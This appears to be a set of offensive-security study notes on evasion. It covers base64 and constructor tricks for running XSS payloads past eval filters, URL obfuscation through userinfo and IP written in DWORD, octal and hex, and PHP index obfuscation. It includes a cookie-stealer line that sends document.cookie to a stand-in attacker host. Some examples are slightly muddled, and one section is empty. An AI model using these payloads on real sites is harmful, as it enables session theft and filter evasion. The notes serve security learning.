# Evasion Basics



### Base64 Encoding Evasion



#### Cookie stealer

To steal cookies, not marked as `HttpOnly` is relatively easy and we commonly use this JavaScript payload:

```
location.href = 'http://evilpath.com/?c='+escape(document.cookie)
```



Using Base64 encoding, we can hide document.cookie code translating the attack vector into:

base64 of `alert(1)` is `YWxlcnQoMSk=`

```
eval(atob("YWxlcnQoMSk="));   ===> eval(alert(1))
```



if eval is blacklisted

```
[].constructor.constructor("alert(1)")();

[].constructor.constructor(atob("YWxlcnQoMSk="))();

setTimeout("alert(1)")

setTimeout(("alert(1)"),500)

setInterval(alert(1))

Function(alert(1))()         "F" must be upper-case letter
```





#### URI Obfuscation Techniques
**URL shortening**: is a technique in which a URL may be shorter in length and still direct to the required page.

- [bitly](https://bitly.com/)
- [tinyurl](https://tinyurl.com/)



**short link preview:** 

- https://security.thejoshmeister.com/2009/04/how-to-preview-shortened-urls-tinyurl.html

- ```
  curl -I https://shorturl.at/JKQdD   and see the Location header in the response
  ```





**URL Authority Obfuscation**

![](./assets/1.png)



The authority component is structured as:

[ userinfo "@" ] host [ ":" port ]



**Obfuscating with Userinfo**

The `userinfo` subcomponent is used for authentication . If credentials are required to access a resource, they can be included here, and the login will be automatic:

http://username:password@www.domain.com/protected_path

if the page required no authentication, the subcomponent text is ignored by both browser and server.



if the resource does not require authentication, we could play with this URI

https://www.google.com@domain.com



**Obfuscating with host**

google.com is translated to 173.194.35.23 via Dot-decimal notation



IP to DWORD format:

To convert an IP address to DWORD, open your calculator in scientific mode. Let’s take the above IP address, which is “91.193.72.70”. Split the IP address into four octets - 91, 193, 72 and 70.

So, one of Google's IP address, 216.58.215.78 can be translated to 3627734862 and it can be accessed using an internet browser as http://3627734862





IP to OCTAL format:

An IP address can also be represented in Octal form. The result is as follows: http://91.193.72.70  => http://0133.0301.0110.0106

We can also "feed" each number by adding leading zeroes without break the original value as follows:

http://0000000330.0000000072.0000000327.000000116





IP to HEX format:

the Google's IP is: http://0xd83ad74e Each number can also be separated like this: http://0xd8.0x3a.0xd7.0x4e



![](./assets/2.png)



ip converter:

https://www.silisoftware.com/tools/ipconverter.php



JavaScript Encoding Non Alphanumeric:

- [Jencode](https://utf-8.jp/public/jjencode.html)
- [AAencode](https://utf-8.jp/public/aaencode.html)
- [jsfuck](https://jsfuck.com/)







#### PHP Obfuscation Techniques

##### Type Juggling











##### Numerical Data Types

```php
$x = "Giuseppe";
echo $x[0];							// decimal  G
echo $x[0001];						// octal    i
echo $x[0x02];						// hex      u
echo $x[0b11];						// binary   s

echo $x[0.1];						// floating(0.1) casted to 0 ==> G
echo $x[0.1e+1];					// exponential				 ==> i
echo $x[0.2e+1];					//long exponential			 ==> u

echo $x[false];						//	G
echo $x[true];						//	i
echo $x[count(['d'])+true];			//	u


echo $x[(int)"hello"];				//  G
echo $x[(int)!0];					//  i
echo $x[(int)"2+1"];				//  u
echo $x[(int)"3.11"];				//  s
```

